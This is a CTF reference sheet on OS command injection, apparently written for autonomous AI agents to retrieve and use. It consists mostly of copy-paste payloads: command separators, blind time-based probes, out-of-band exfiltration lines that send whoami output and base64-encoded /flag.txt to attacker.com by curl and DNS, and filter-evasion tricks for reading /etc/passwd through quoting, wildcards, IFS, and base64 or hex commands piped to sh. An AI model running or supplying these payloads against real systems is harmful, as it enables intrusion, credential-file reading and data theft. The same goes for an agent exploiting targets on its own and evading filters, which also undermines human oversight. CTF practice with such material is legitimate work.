# Command Injection - CTF Exploitation Reference

> **Document Purpose:** Actionable OS command injection techniques for CTF challenges.
> Designed for autonomous agent retrieval with copy-paste payloads,
> detection methodology, and filter bypass techniques.

---

## 1. QUICK REFERENCE: Detection

> **When to use this section:** You suspect user input is passed to a system command
> (e.g., ping, nslookup, file operations, or other system utilities).

### 1.1 Detection Indicators

**Tags:** `cmdi, command-injection, detection, indicators`

Look for these signs:
- Features that wrap system commands: ping, traceroute, nslookup, whois, file conversion
- Challenge description mentions: "command", "shell", "system", "exec", "ping"
- Input fields for IP addresses, hostnames, filenames, or URLs
- Response contains OS command output formatting
- Error messages revealing command execution: `sh:`, `bash:`, `cmd.exe`

### 1.2 Quick Test Payloads (Linux)

**Tags:** `cmdi, quick-test, linux, payloads`

```
; id
| id
|| id
&& id
`id`
$(id)
%0a id
; whoami
```

**Success indicators:** `uid=`, `gid=`, username output

### 1.3 Quick Test Payloads (Windows)

**Tags:** `cmdi, quick-test, windows, payloads`

```
& dir
| dir
|| dir
&& dir
; dir
```

**Success indicators:** `<DIR>`, `Volume Serial Number`, drive letter output

**Agent Takeaway:**
- Start with `; id` (Linux) or `& dir` (Windows) — simplest tests
- If output-based detection fails, try time-based detection with `sleep`
- Use `cmdi_probe` tool for automated testing of all separators

---

## 2. COMMAND SEPARATORS

> **When to use this section:** You need to understand which separator to use
> based on the target OS and command context.

### 2.1 Linux/Unix Separators

**Tags:** `cmdi, separators, linux, unix`

| Separator | Behavior | Example |
|-----------|----------|---------|
| `;` | Sequential execution | `ping 127.0.0.1; id` |
| `\|` | Pipe (second always runs) | `ping 127.0.0.1 \| id` |
| `\|\|` | OR (second runs if first fails) | `invalid \|\| id` |
| `&&` | AND (second runs if first succeeds) | `ping 127.0.0.1 && id` |
| `` ` `` | Backtick substitution | `` ping `id` `` |
| `$()` | Command substitution | `ping $(id)` |
| `%0a` | Newline (URL encoded) | `ping%0aid` |
| `\n` | Newline (literal) | `ping\nid` |

### 2.2 Windows Separators

**Tags:** `cmdi, separators, windows`

| Separator | Behavior | Example |
|-----------|----------|---------|
| `&` | Sequential execution | `ping 127.0.0.1 & dir` |
| `\|` | Pipe | `ping 127.0.0.1 \| dir` |
| `\|\|` | OR | `invalid \|\| dir` |
| `&&` | AND | `ping 127.0.0.1 && dir` |

**Agent Takeaway:**
- Try ALL separators — different apps handle them differently
- `|` (pipe) is often the most reliable as it always executes the second command
- `$()` and backticks work for command substitution within arguments
- `%0a` (newline) often bypasses simple blacklist filters

---

## 3. BLIND COMMAND INJECTION

> **When to use this section:** Command output is not reflected in the response.

### 3.1 Time-Based Detection

**Tags:** `cmdi, blind, time-based, sleep, detection`

**Linux:**
```
; sleep 5
| sleep 5
$(sleep 5)
`sleep 5`
; ping -c 5 127.0.0.1
```

**Windows:**
```
& timeout /t 5
& ping -n 5 127.0.0.1
| ping -n 5 127.0.0.1
```

**Detection:** Response takes >4 seconds longer than baseline = injection confirmed.

### 3.2 Out-of-Band (OOB) Exfiltration

**Tags:** `cmdi, blind, oob, dns, exfiltration`

**DNS exfiltration:**
```
; nslookup `whoami`.attacker.com
; host `cat /flag.txt | base64`.attacker.com
$(nslookup $(whoami).attacker.com)
```

**HTTP exfiltration:**
```
; curl http://attacker.com/?data=$(cat /flag.txt | base64)
; wget http://attacker.com/$(whoami)
```

### 3.3 File-Based Exfiltration

**Tags:** `cmdi, blind, file, output-redirect`

Write output to a web-accessible file:
```
; id > /var/www/html/output.txt
; cat /flag.txt > /var/www/html/flag.txt
```
Then fetch the file via HTTP.

**Agent Takeaway:**
- Time-based is the most reliable blind detection method
- Use `sleep 5` and compare response times to baseline
- DNS exfiltration requires an attacker-controlled domain (less common in CTFs)
- File-based exfiltration works if you know the web root path

---

## 4. FILTER BYPASS TECHNIQUES

> **When to use this section:** Basic command injection payloads are being blocked
> by input validation or WAF.

### 4.1 Space Bypass

**Tags:** `cmdi, bypass, space, filter-evasion`

When spaces are filtered:
```
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
cat$IFS$9/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd
X=$'cat\x20/etc/passwd'&&$X
cat%09/etc/passwd    (tab character)
```

### 4.2 Keyword Bypass

**Tags:** `cmdi, bypass, keyword, obfuscation`

When specific command names are filtered:
```
c'a't /etc/passwd
c"a"t /etc/passwd
ca\t /etc/passwd
/bin/c?t /etc/passwd
/bin/ca* /etc/passwd
c${not_exist}at /etc/passwd
```

**Wildcard-based:**
```
/???/??t /etc/passwd     (matches /bin/cat)
/???/??n/?s              (matches /bin/bin/ls)
```

### 4.3 Encoding Bypass

**Tags:** `cmdi, bypass, encoding, base64, hex`

**Base64 execution:**
```
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh
$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)
```

**Hex execution:**
```
$(printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64')
echo -e '\x63\x61\x74 \x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64' | sh
```

**Octal execution:**
```
$'\143\141\164\040\057\145\164\143\057\160\141\163\163\167\144'
```

### 4.4 Blacklist Bypass Cheat Sheet

**Tags:** `cmdi, bypass, cheatsheet, blacklist`

| Blocked | Bypass |
|---------|--------|
| spaces | `${IFS}`, `$IFS$9`, `{cmd,arg}`, `<`, `%09` |
| `cat` | `c'a't`, `tac`, `less`, `head`, `tail`, `nl`, `xxd` |
| `ls` | `dir`, `find .`, `echo *` |
| `id` | `i'd'`, `/usr/bin/i?` |
| `/etc/passwd` | `/e'tc'/pa'ss'wd`, `/etc/pass??` |
| `flag` | `fl'a'g`, `f???`, `fl*` |

**Agent Takeaway:**
- `${IFS}` is the most reliable space bypass
- Quote insertion (`c'a't`) works on most shells
- Base64 encoding bypasses most keyword filters
- Use `cmdi_payload_generator` with `filter_bypass` operation for comprehensive bypass lists
- Wildcards (`?`, `*`) are powerful for bypassing exact keyword matches
